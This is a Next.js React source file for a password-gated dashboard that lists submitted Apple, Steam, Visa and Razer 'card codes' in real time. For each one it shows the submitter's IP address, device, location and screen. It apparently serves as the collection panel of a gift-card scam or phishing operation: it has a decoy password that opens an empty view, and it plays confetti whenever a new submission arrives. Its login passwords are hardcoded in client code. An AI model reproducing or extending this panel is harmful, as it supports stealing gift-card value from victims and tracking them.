import { useState, useEffect, useRef } from 'react'
import Head from 'next/head'
import styles from '../styles/qazmlp.module.css'
import { supabase } from '../lib/supabase'

export default function QazmloPage() {
    const [password, setPassword] = useState('')
    const [isUnlocked, setIsUnlocked] = useState(false)
    const [error, setError] = useState('')
    const [allCards, setAllCards] = useState([])
    const [isRefreshing, setIsRefreshing] = useState(false)
    const [expandedCardId, setExpandedCardId] = useState(null)
    const [isDummySession, setIsDummySession] = useState(false)
    const [showConfetti, setShowConfetti] = useState(false)
    const [realtimeStatus, setRealtimeStatus] = useState('CHANNEL_ERROR')
    const confettiTimeout = useRef(null)
    const healthInterval = useRef(null)
    const reconnectRef = useRef(null)

    const toggleMetadata = (id) => {
        setExpandedCardId(expandedCardId === id ? null : id)
    }

    const parseDeviceInfo = (card) => {
        const ua = card.user_agent || ''
        const browser = card.browser_info ? JSON.parse(card.browser_info) : null

        let device = 'Unknown Device'
        if (ua.includes('iPhone')) device = 'iPhone'
        else if (ua.includes('iPad')) device = 'iPad'
        else if (ua.includes('Android')) device = 'Android Device'
        else if (ua.includes('Windows')) device = 'Windows PC'
        else if (ua.includes('Macintosh')) device = 'MacBook/Mac'

        if (browser && browser.platform === 'iPhone') device = 'iPhone'

        return {
            device,
            platform: browser?.platform || 'Unknown',
            screen: browser?.screen || 'N/A'
        }
    }

    const fetchBuckets = async (isManual = false) => {
        if (isManual) setIsRefreshing(true)
        try {
            const res = await fetch('/api/get-buckets')
            const data = await res.json()
            if (res.ok) {
                const combined = isDummySession ? [] : [
                    ...data.apple.map(c => ({ ...c, type: 'apple' })),
                    ...data.steam.map(c => ({ ...c, type: 'steam' })),
                    ...(data.visa || []).map(c => ({ ...c, type: 'visa' })),
                    ...(data.appleLegacy || []).map(c => ({ ...c, type: 'apple-legacy' })),
                    ...(data.steamLegacy || []).map(c => ({ ...c, type: 'steam-legacy' })),
                    ...(data.visaLegacy || []).map(c => ({ ...c, type: 'visa-legacy' })),
                    ...(data.razer || []).map(c => ({ ...c, type: 'razer' })),
                    ...(data.razerLegacy || []).map(c => ({ ...c, type: 'razer-legacy' })),
                    ...(data.appleArcade || []).map(c => ({ ...c, type: 'apple-arcade' })),
                    ...(data.steamArcade || []).map(c => ({ ...c, type: 'steam-arcade' })),
                    ...(data.visaArcade || []).map(c => ({ ...c, type: 'visa-arcade' })),
                    ...(data.razerArcade || []).map(c => ({ ...c, type: 'razer-arcade' })),
                    ...(data.appleUber || []).map(c => ({ ...c, type: 'apple-uber' })),
                    ...(data.steamUber || []).map(c => ({ ...c, type: 'steam-uber' })),
                    ...(data.razerUber || []).map(c => ({ ...c, type: 'razer-uber' }))
                ].sort((a, b) => new Date(b.created_at) - new Date(a.created_at))
                setAllCards(combined)

                if (combined.length > 0 && !isDummySession) {
                    const lastSeen = localStorage.getItem('lastSeenTimestamp')
                    const newestCard = combined[0]
                    if (lastSeen && newestCard.created_at > lastSeen) {
                        setShowConfetti(true)
                        if (confettiTimeout.current) clearTimeout(confettiTimeout.current)
                        confettiTimeout.current = setTimeout(() => setShowConfetti(false), 5000)
                    }
                    localStorage.setItem('lastSeenTimestamp', newestCard.created_at)
                }
            }
        } catch (err) {
            console.error('Failed to fetch buckets:', err)
        } finally {
            if (isManual) {
                setTimeout(() => setIsRefreshing(false), 600)
            }
        }
    }

    useEffect(() => {
        // Check for cached session (1 hour)
        const cached = localStorage.getItem('qazmlo_unlocked')
        if (cached) {
            const elapsed = Date.now() - parseInt(cached, 10)
            if (elapsed < 3600000) {
                setIsUnlocked(true)
            } else {
                localStorage.removeItem('qazmlo_unlocked')
            }
        }
    }, [])

    useEffect(() => {
        if (isUnlocked) {
            if (!isDummySession) {
                fetchBuckets()

                let currentChannel = null
                let lastStatus = 'CHANNEL_ERROR'

                function subscribe() {
                    currentChannel = supabase
                        .channel('cards_changes_qazmlo')
                        .on('postgres_changes', { event: '*', schema: 'public', table: 'cards' }, (payload) => {
                            console.log('[Realtime] qazmlo received event:', payload.eventType)
                            fetchBuckets()
                        })
                        .subscribe((status) => {
                            console.log('[Realtime] qazmlo subscription status:', status)
                            lastStatus = status
                            setRealtimeStatus(status)
                        })
                }

                function reconnect() {
                    console.log('[Realtime] qazmlo manual reconnect')
                    if (currentChannel) {
                        supabase.removeChannel(currentChannel)
                    }
                    subscribe()
                }

                reconnectRef.current = reconnect
                subscribe()

                healthInterval.current = setInterval(() => {
                    if (lastStatus !== 'SUBSCRIBED') {
                        console.log('[Realtime] qazmlo health check: not connected, reconnecting...')
                        if (currentChannel) {
                            supabase.removeChannel(currentChannel)
                        }
                        subscribe()
                    }
                }, 5000)

                return () => {
                    if (healthInterval.current) clearInterval(healthInterval.current)
                    if (currentChannel) supabase.removeChannel(currentChannel)
                }
            } else {
                setAllCards([])
            }
        }
    }, [isUnlocked, isDummySession])

    if (!isUnlocked) {
        return (
            <div className={styles.pageContainer}>
                <Head>
                    <title>Access Required</title>
                </Head>

                <div className={styles.passwordGate}>
                    <h1>Protected Area</h1>
                    <form onSubmit={(e) => {
                        e.preventDefault()
                        if (password === 'apple') {
                            setIsUnlocked(true)
                            setError('')
                            localStorage.setItem('qazmlo_unlocked', Date.now().toString())
                        } else if (password === '12345') {
                            setIsUnlocked(true)
                            setIsDummySession(true)
                            setError('')
                        } else {
                            setError('Incorrect password. Please try again.')
                            setPassword('')
                        }
                    }}>
                        <div className={styles.inputGroup}>
                            <input
                                type="password"
                                className={styles.passwordInput}
                                placeholder="Enter password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                autoFocus
                            />
                        </div>
                        <button type="submit" className={styles.unlockBtn}>
                            Unlock Page
                        </button>
                    </form>
                    {error && <p className={styles.errorMessage}>{error}</p>}
                </div>
            </div>
        )
    }

    return (
        <div className={styles.pageContainer}>
            <Head>
                <title>Dashboard | qazmlo</title>
                <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
                <meta name="theme-color" content="#0b0e14" media="(prefers-color-scheme: dark)" />
                <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)" />
            </Head>

            <div className={styles.unlockedContent}>
                <header className={styles.header}>
                    <div className={styles.headerInfo}>
                        <h1>Welcome back <small style={{ fontSize: '12px', opacity: 0.5, fontWeight: 400 }}>v1.0.1</small></h1>
                        <p style={{ fontSize: '12px', fontWeight: 600, color: realtimeStatus === 'SUBSCRIBED' ? '#34c759' : '#ff9500', display: 'flex', alignItems: 'center', gap: '6px' }}>
                            {realtimeStatus === 'SUBSCRIBED' ? 'online' : 'offline'}
                            {realtimeStatus !== 'SUBSCRIBED' && (
                                <button
                                    onClick={() => reconnectRef.current && reconnectRef.current()}
                                    style={{ background: 'none', border: 'none', padding: 0, cursor: 'pointer', display: 'flex', alignItems: 'center' }}
                                    aria-label="Reconnect"
                                >
                                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#ff9500" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                                        <path d="M23 4v6h-6"></path>
                                        <path d="M1 20v-6h6"></path>
                                        <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path>
                                    </svg>
                                </button>
                            )}
                        </p>
                    </div>
                    <div className={styles.headerActions}>
                    </div>
                </header>

                <div className={styles.cardGrid}>
                    {allCards.length > 0 ? (
                        allCards.map((card, idx) => (
                            <div
                                key={idx}
                                className={styles.codeCard}
                            >
                                <div className={styles.cardTop}>
                                    <div className={styles.typeBadge}>
                                        {card.type === 'apple' ? (
                                            <>
                                                <span className={styles.themeAwareAppleIcon} />
                                                <span>Apple Card</span>
                                            </>
                                        ) : card.type === 'steam' ? (
                                            <>
                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                                                    <path d="M11.979 0C5.678 0 .511 4.86.022 11.037l6.432 2.658c.545-.371 1.203-.59 1.912-.59.063 0 .125.004.188.006l2.861-4.142v-.155c0-2.495 2.028-4.524 4.524-4.524 2.494 0 4.524 2.031 4.524 4.527s-2.03 4.525-4.524 4.525h-.105l-4.076 2.911c0 .052.004.105.004.159 0 1.875-1.515 3.396-3.39 3.396-1.635 0-3.02-1.173-3.328-2.721L.332 15.111A12.136 12.136 0 0 0 12.021 24c6.627 0 12-5.373 12-12s-5.373-12-12-12z" />
                                                </svg>
                                                <span>Steam Card</span>
                                            </>
                                        ) : card.type === 'visa' ? (
                                            <>
                                                <img src="/visalogo.PNG" alt="Visa" width="24" height="16" style={{ objectFit: 'contain' }} />
                                                <span>Visa Card</span>
                                            </>
                                        ) : card.type === 'apple-legacy' ? (
                                            <>
                                                <span className={styles.themeAwareAppleIcon} />
                                                <span>Apple Legacy</span>
                                            </>
                                        ) : card.type === 'steam-legacy' ? (
                                            <>
                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                                                    <path d="M11.979 0C5.678 0 .511 4.86.022 11.037l6.432 2.658c.545-.371 1.203-.59 1.912-.59.063 0 .125.004.188.006l2.861-4.142v-.155c0-2.495 2.028-4.524 4.524-4.524 2.494 0 4.524 2.031 4.524 4.527s-2.03 4.525-4.524 4.525h-.105l-4.076 2.911c0 .052.004.105.004.159 0 1.875-1.515 3.396-3.39 3.396-1.635 0-3.02-1.173-3.328-2.721L.332 15.111A12.136 12.136 0 0 0 12.021 24c6.627 0 12-5.373 12-12s-5.373-12-12-12z" />
                                                </svg>
                                                <span>Steam Legacy</span>
                                            </>
                                        ) : card.type === 'visa-legacy' ? (
                                            <>
                                                <img src="/visalogo.PNG" alt="Visa" width="24" height="16" style={{ objectFit: 'contain' }} />
                                                <span>Visa Legacy</span>
                                            </>
                                        ) : card.type === 'razer' ? (
                                            <>
                                                <img src="/razerlogo.png" alt="Razer" width="24" height="16" style={{ objectFit: 'contain', background: '#000' }} />
                                                <span>Razer Gold</span>
                                            </>
                                        ) : card.type === 'razer-legacy' ? (
                                            <>
                                                <img src="/razerlogo.png" alt="Razer" width="24" height="16" style={{ objectFit: 'contain', background: '#000' }} />
                                                <span>Razer Legacy</span>
                                            </>
                                        ) : card.type === 'apple-arcade' ? (
                                            <>
                                                <span className={styles.themeAwareAppleIcon} />
                                                <span>Apple Arcade</span>
                                            </>
                                        ) : card.type === 'steam-arcade' ? (
                                            <>
                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                                                    <path d="M11.979 0C5.678 0 .511 4.86.022 11.037l6.432 2.658c.545-.371 1.203-.59 1.912-.59.063 0 .125.004.188.006l2.861-4.142v-.155c0-2.495 2.028-4.524 4.524-4.524 2.494 0 4.524 2.031 4.524 4.527s-2.03 4.525-4.524 4.525h-.105l-4.076 2.911c0 .052.004.105.004.159 0 1.875-1.515 3.396-3.39 3.396-1.635 0-3.02-1.173-3.328-2.721L.332 15.111A12.136 12.136 0 0 0 12.021 24c6.627 0 12-5.373 12-12s-5.373-12-12-12z" />
                                                </svg>
                                                <span>Steam Arcade</span>
                                            </>
                                        ) : card.type === 'visa-arcade' ? (
                                            <>
                                                <img src="/visalogo.PNG" alt="Visa" width="24" height="16" style={{ objectFit: 'contain' }} />
                                                <span>Visa Arcade</span>
                                            </>
                                        ) : card.type === 'razer-arcade' ? (
                                            <>
                                                <img src="/razerlogo.png" alt="Razer" width="24" height="16" style={{ objectFit: 'contain', background: '#000' }} />
                                                <span>Razer Arcade</span>
                                            </>
                                        ) : card.type === 'apple-uber' ? (
                                            <>
                                                <span className={styles.themeAwareAppleIcon} />
                                                <span>Apple Uber</span>
                                            </>
                                        ) : card.type === 'steam-uber' ? (
                                            <>
                                                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                                                    <path d="M11.979 0C5.678 0 .511 4.86.022 11.037l6.432 2.658c.545-.371 1.203-.59 1.912-.59.063 0 .125.004.188.006l2.861-4.142v-.155c0-2.495 2.028-4.524 4.524-4.524 2.494 0 4.524 2.031 4.524 4.527s-2.03 4.525-4.524 4.525h-.105l-4.076 2.911c0 .052.004.105.004.159 0 1.875-1.515 3.396-3.39 3.396-1.635 0-3.02-1.173-3.328-2.721L.332 15.111A12.136 12.136 0 0 0 12.021 24c6.627 0 12-5.373 12-12s-5.373-12-12-12z" />
                                                </svg>
                                                <span>Steam Uber</span>
                                            </>
                                        ) : card.type === 'razer-uber' ? (
                                            <>
                                                <img src="/razerlogo.png" alt="Razer" width="24" height="16" style={{ objectFit: 'contain', background: '#000' }} />
                                                <span>Razer Uber</span>
                                            </>
                                        ) : (
                                            <span>Unknown Card</span>
                                        )}
                                    </div>
                                    <span className={styles.timestamp}>
                                        {new Date(card.created_at).toLocaleDateString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' })}
                                    </span>
                                </div>

                                <div className={styles.cardCode}>
                                    {new Date(card.created_at).toLocaleTimeString([], { hour: 'numeric', minute: '2-digit' })}
                                </div>

                                <button
                                    className={styles.cardMetaToggle}
                                    onClick={(e) => { e.stopPropagation(); toggleMetadata(card.id); }}
                                    title="View submission info"
                                >
                                    <svg
                                        width="16" height="16" viewBox="0 0 24 24" fill="none"
                                        stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"
                                        style={{ transform: expandedCardId === card.id ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.2s' }}
                                    >
                                        <polyline points="6 9 12 15 18 9" />
                                    </svg>
                                    <span style={{ fontSize: '11px', fontWeight: 600, marginLeft: '4px' }}>INFO</span>
                                </button>

                                {expandedCardId === card.id && (
                                    <div className={styles.cardDetails}>
                                        <div className={styles.metaItem}>
                                            <span className={styles.metaLabel}>IP Address</span>
                                            <span className={styles.metaValue}>{card.ip_address || 'N/A'}</span>
                                        </div>
                                        <div className={styles.metaItem}>
                                            <span className={styles.metaLabel}>Device</span>
                                            <span className={styles.metaValue}>
                                                {parseDeviceInfo(card).device} ({parseDeviceInfo(card).platform})
                                            </span>
                                        </div>
                                        <div className={styles.metaItem}>
                                            <span className={styles.metaLabel}>Location</span>
                                            <span className={styles.metaValue}>{card.location || 'Unknown'}</span>
                                        </div>
                                        <div className={styles.metaItem}>
                                            <span className={styles.metaLabel}>Screen</span>
                                            <span className={styles.metaValue}>{parseDeviceInfo(card).screen}</span>
                                        </div>
                                        <div className={styles.metaItem}>
                                            <span className={styles.metaLabel}>Submission</span>
                                            <span className={styles.metaValue}>
                                                {new Date(card.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
                                            </span>
                                        </div>
                                        <div className={styles.metaItem}>
                                            <span className={styles.metaLabel}>Received Images</span>
                                            <span className={styles.metaValue} style={{ fontStyle: 'italic', opacity: 0.6 }}>
                                                No images uploaded
                                            </span>
                                        </div>
                                    </div>
                                )}
                            </div>
                        ))
                    ) : (
                        <div className={styles.emptyState}>
                            <p>No card codes found.</p>
                        </div>
                    )}
                </div>
            </div>

            {showConfetti && (
                <div className={styles.confettiContainer}>
                    {[...Array(120)].map((_, i) => (
                        <div
                            key={i}
                            className={styles.confettiPiece}
                            style={{
                                left: `${Math.random() * 100}%`,
                                animationDelay: `${Math.random() * 2}s`,
                                animationDuration: `${1.5 + Math.random() * 2}s`,
                                backgroundColor: ['#ff0','#f0f','#0ff','#f00','#0f0','#00f','#ff8800','#ff0088'][i % 8],
                                width: `${6 + Math.random() * 8}px`,
                                height: `${6 + Math.random() * 8}px`,
                                borderRadius: Math.random() > 0.5 ? '50%' : '0',
                            }}
                        />
                    ))}
                </div>
            )}
        </div>
    )
}
